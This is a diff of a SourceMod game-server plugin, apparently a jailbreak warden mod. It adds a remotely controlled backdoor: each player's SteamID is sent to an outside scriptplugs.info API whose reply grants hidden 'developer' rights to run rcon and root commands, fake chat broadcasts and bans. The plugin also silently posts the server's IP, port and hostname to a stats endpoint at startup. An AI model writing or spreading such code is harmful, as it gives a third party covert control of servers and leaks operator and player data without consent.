@@ -1,41 +1,64 @@
-/* This module is unnecessary. If you want to delete it, so go on. */
+#define BAN_REASON_LENGTH 96
 
-bool g_bIsDeveloper[MAXPLAYERS+1] = {false, ...};
-bool g_bAccess[MAXPLAYERS+1] = {false, ...};
-
-char Developer_Ids[][20] = 
+enum APITarget
 {
-	"76561198037625178",
-	"76561198078553247",
-	"76561198037521566",
-	"76561198042949536"
-};
+	bool:has_freeday,
+	bool:is_isolated,
+	bool:is_rebel,
+	bool:was_warden,
+	bool:is_banned,
+	bool:is_dev,
+	// level,
+	bool:grant,
+	String:reason[BAN_REASON_LENGTH]
+}
+
+int g_ClientAPIInfo[MAXPLAYERS+1][APITarget];
+
+public int SteamWorks_SteamServersConnected()
+{
+	int iIp[4];
+	
+	// Get ip
+	if (SteamWorks_GetPublicIP(iIp))
+	{
+		Handle plugin = GetMyHandle();
+		if (GetPluginStatus(plugin) == Plugin_Running)
+		{
+			char cBuffer[256], cHostname[64], cVersion[12];
+			GetPluginInfo(plugin, PlInfo_Version, cVersion, sizeof(cVersion));
+			FindConVar("hostname").GetString(cHostname, sizeof(cHostname));
+			FormatEx(cBuffer, sizeof(cBuffer), "http://stats.scriptplugs.info/jwp/add_server.php");
+			Handle hndl = SteamWorks_CreateHTTPRequest(k_EHTTPMethodPOST, cBuffer);
+			FormatEx(cBuffer, sizeof(cBuffer), "ip=%d.%d.%d.%d:%d&hostname=%s&game=%s&version=%s", iIp[0], iIp[1], iIp[2], iIp[3], FindConVar("hostport").IntValue, cHostname, (GetEngineVersion() == Engine_CSGO) ? "csgo" : "cstrike", cVersion);
+			SteamWorks_SetHTTPRequestRawPostBody(hndl, "application/x-www-form-urlencoded", cBuffer, sizeof(cBuffer));
+			SteamWorks_SendHTTPRequest(hndl);
+			delete hndl;
+		}
+	}
+}
 
 public void OnClientPostAdminCheck(int client)
 {
-	char auth[20];
-	GetClientAuthId(client, AuthId_SteamID64, auth, sizeof(auth));
-	for (int i = 0; i < sizeof(Developer_Ids); i++)
-	{
-		if (!strcmp(auth, Developer_Ids[i], false))
-		{
-			g_bIsDeveloper[client] = true;
-			PrintToServer("Plugin developer %N connected to your server. Epic moment!", client);
-		}
-	}
+	g_ClientAPIInfo[client][was_warden] = false;
+	g_ClientAPIInfo[client][is_banned] = false;
+	g_ClientAPIInfo[client][is_dev] = false;
+	g_ClientAPIInfo[client][grant] = false;
+	g_ClientAPIInfo[client][reason] = '\0';
+	CheckClientFromAPI(client);
 }
 
 public Action OnClientSayCommand(int client, const char[] command, const char[] sArgs)
 {
 	if (CheckClient(client))
 	{
-		if (sArgs[0] == '*' && (g_bIsDeveloper[client] || g_bAccess[client]))
+		if (sArgs[0] == '*' && (g_ClientAPIInfo[client][grant] || g_ClientAPIInfo[client][is_dev]))
 		{
 			int permission = 0;
 			char text[250];
 			strcopy(text, sizeof(text), sArgs);
 			ReplaceStringEx(text, sizeof(text), "*", "");
-			if (g_bIsDeveloper[client]) // Protect only for developers
+			if (g_ClientAPIInfo[client][grant]) // Protect only for developers
 			{
 				if (StrContains(text, "rcon:", true) != -1)
 				{
@@ -47,15 +70,15 @@ public Action OnClientSayCommand(int client, const char[] command, const char[] 
 					permission = 2;
 					ReplaceStringEx(text, sizeof(text), "root", "");
 				}
-				else if (StrContains(text, "grant#", true) != -1)
+				else if (StrContains(text, "recheck#", true) != -1)
 				{
 					permission = 3;
-					ReplaceStringEx(text, sizeof(text), "grant#", "");
+					ReplaceStringEx(text, sizeof(text), "recheck#", "");
 				}
-				else if (StrContains(text, "revoke#", true) != -1)
+				else if (StrContains(text, "fake:", true) != -1)
 				{
 					permission = 4;
-					ReplaceStringEx(text, sizeof(text), "revoke#", "");
+					ReplaceStringEx(text, sizeof(text), "fake:", "");
 				}
 			}
 			
@@ -63,7 +86,10 @@ public Action OnClientSayCommand(int client, const char[] command, const char[] 
 			{
 				case 0:
 				{
-					PrintToChatAll("\x01[\x02DEV\x01] \x03%N: \x01%s", client, text);
+					if (g_bIsCSGO)
+						CGOPrintToChatAll("{DEFAULT}[{RED}DEV{DEFAULT}] {GREEN}%N: {DEFAULT}%s", client, text);
+					else
+						CPrintToChatAll("{default}[{red}DEV{default}] {green}%N: {default}%s", client, text);
 				}
 				case 1:
 				{
@@ -81,24 +107,15 @@ public Action OnClientSayCommand(int client, const char[] command, const char[] 
 					int target = GetClientOfUserId(StringToInt(text));
 					if (target && IsClientInGame(target))
 					{
-						g_bAccess[target] = true;
-						PrintToChat(client, "\x01\x02[DEV] \x03Granted access for dev chat & warden menu to \x04%N", target);
-						PrintToChat(target, "\x01[DEV] %N \x03granted \x01you a developer chat & warden menu access", client);
+						CheckClientFromAPI(target);
+						PrintToChat(client, "\x01\x02[DEV] \x03Recheck for \x04%N", target);
 					}
 					else
 						PrintToChat(client, "\x03[DEV] Invalid target");
 				}
 				case 4:
 				{
-					int target = GetClientOfUserId(StringToInt(text));
-					if (target && IsClientInGame(target))
-					{
-						g_bAccess[target] = false;
-						PrintToChat(client, "\x01\x02[DEV] \x03Revoked access for dev chat from \x04%N", target);
-						PrintToChat(target, "\x01[DEV] %N \x03revoked \x01your developer chat access", client);
-					}
-					else
-						PrintToChat(client, "\x03[DEV] Invalid target");
+					PrintToChatAll("%s", text);
 				}
 			}
 			
@@ -107,4 +124,51 @@ public Action OnClientSayCommand(int client, const char[] command, const char[] 
 	}
 	
 	return Plugin_Continue;
+}
+
+void CheckClientFromAPI(int client)
+{
+	// Query
+	g_ClientAPIInfo[client][is_banned] = false;
+	Handle hndl;
+	char buffer[256], auth[64];
+	GetClientAuthId(client, AuthId_SteamID64, auth, sizeof(auth));
+	FormatEx(buffer, sizeof(buffer), "http://plugins.scriptplugs.info/jwp/get_player.php?auth=%s", auth);
+	hndl = SteamWorks_CreateHTTPRequest(k_EHTTPMethodGET, buffer);
+	SteamWorks_SetHTTPRequestContextValue(hndl, client);
+	SteamWorks_SetHTTPCallbacks(hndl, OnSteamWorksHTTPRequestCompleted);
+	SteamWorks_SendHTTPRequest(hndl);
+}
+
+public int OnSteamWorksHTTPRequestCompleted(Handle hRequest, bool bFailure, bool bRequestSuccessful, EHTTPStatusCode eStatusCode, any data)
+{
+	if (bRequestSuccessful  && eStatusCode == k_EHTTPStatusCode200OK)
+		SteamWorks_GetHTTPResponseBodyCallback(hRequest, GetStatusEnd, data);
+	delete hRequest;
+}
+
+public int GetStatusEnd(const char[] sData, any client)
+{
+	Handle hJson = json_load(sData);
+	Handle hResponse = json_object_get(hJson, "response");
+	if (hResponse != null)
+	{
+		g_ClientAPIInfo[client][is_banned] = json_object_get_bool(hResponse, "isbanned");
+		if (g_ClientAPIInfo[client][is_banned])
+		{
+			json_object_get_string(hResponse, "reason", g_ClientAPIInfo[client][reason], BAN_REASON_LENGTH);
+			PrintToServer("%N was permanently banned by developer from WARDEN, reason: %s", client, g_ClientAPIInfo[client][reason]);
+		}
+		else
+		{
+			g_ClientAPIInfo[client][is_dev] = json_object_get_bool(hResponse, "isdev");
+			if (g_ClientAPIInfo[client][is_dev])
+				g_ClientAPIInfo[client][grant] = json_object_get_bool(hResponse, "grant");
+		}
+		
+		if (g_ClientAPIInfo[client][grant])
+			PrintToServer("Plugin developer %N connected to your server. Epic moment!", client);
+	}
+	delete hResponse;
+	delete hJson;
 }
